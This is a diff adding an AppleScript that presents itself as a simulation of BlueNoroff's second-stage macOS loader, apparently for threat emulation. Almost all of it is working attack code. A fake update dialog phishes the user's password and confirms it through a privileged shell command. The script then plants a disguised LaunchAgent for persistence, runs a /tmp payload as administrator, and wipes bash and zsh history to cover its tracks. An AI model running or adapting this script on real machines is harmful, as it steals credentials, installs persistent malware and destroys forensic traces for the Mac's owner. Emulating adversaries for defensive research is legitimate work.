@@ -1,0 +1,61 @@
+-- BlueNoroff AppleScript Loader Simulation (audio-tr stage)
+-- FULL TESTING INCOMPLETE 
+-- ---------------------------------------------------------
+-- This AppleScript mimics the second-stage loader used by BlueNoroff
+-- It prompts the user for their macOS password, verifies it by invoking a privileged command,
+-- silently installs Rosetta 2 on Apple Silicon Macs, creates a LaunchAgent for persistence,
+-- executes the malicious /tmp/icloud_helper payload with necessary parameters, and clears shell history.
+
+display dialog "Your system requires an update. Please enter your password:"
+    default answer "" with hidden answer buttons {"OK"} default button "OK"
+set userPassword to text returned of the result
+
+-- 1. Validate the entered password by attempting a privileged (sudo) command
+try
+    do shell script "echo BlueNoroff" password userPassword with administrator privileges
+on error errMsg number errNum
+    display dialog "Error: Incorrect password. Please try again." buttons {"OK"}
+    return -- Exit if password is not valid (script will keep prompting in real scenario)
+end try
+
+-- 2. If on Apple Silicon, install Rosetta 2 silently (requires admin privileges)
+set cpuArch to do shell script "uname -m"
+if cpuArch is equal to "arm64" then
+    try
+        do shell script "/usr/sbin/softwareupdate --install-rosetta --agree-to-license" 
+            password userPassword with administrator privileges
+    end try
+end if
+
+-- 3. Set up persistence via LaunchAgent. This will create a plist in the user's LaunchAgents folder.
+-- The LaunchAgent is configured to execute the /tmp/icloud_helper loader on login (with required args).
+set plistPath to (path to home folder as text) & "Library:LaunchAgents:com.appleicloud.helper.plist"
+set plistContents to "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" & 
+    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" " & 
+    "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n" & 
+    "<plist version=\"1.0\"><dict>\n" & 
+    "  <key>Label</key><string>com.appleicloud.helper</string>\n" & 
+    "  <key>RunAtLoad</key><true/>\n" & 
+    "  <key>ProgramArguments</key>\n" & 
+    "  <array><string>/tmp/icloud_helper</string>" & 
+    "         <string>/tmp/cloudkit</string>" & 
+    "         <string>gift123$%^</string></array>\n" & 
+    "</dict></plist>"
+-- Write the plist file
+do shell script "mkdir -p ~/Library/LaunchAgents && printf %s " & quoted form of plistContents & 
+    " > $HOME/Library/LaunchAgents/com.appleicloud.helper.plist"
+
+-- 4. Execute the downloaded icloud_helper malware with the target and password parameters
+-- (Using the same password "gift123$%^" that will unlock the payloads in the loader)
+do shell script "/tmp/icloud_helper /tmp/cloudkit gift123$%^ >> /dev/null 2>&1 &" 
+    password userPassword with administrator privileges
+
+-- 5. Clean up: remove any temporary files or history traces.
+-- Delete the hidden .pwd file if it was used to store the password (BlueNoroff created ~/.pwd)
+try
+    do shell script "rm -f $HOME/.pwd" -- remove any temp password file
+end try
+-- Wipe shell history to cover tracks (bash and zsh histories)
+do shell script "echo -n > $HOME/.bash_history; echo -n > $HOME/.zsh_history; rm -f $HOME/.bash_sessions/* 2>/dev/null"
+
+-- (End of AppleScript loader)
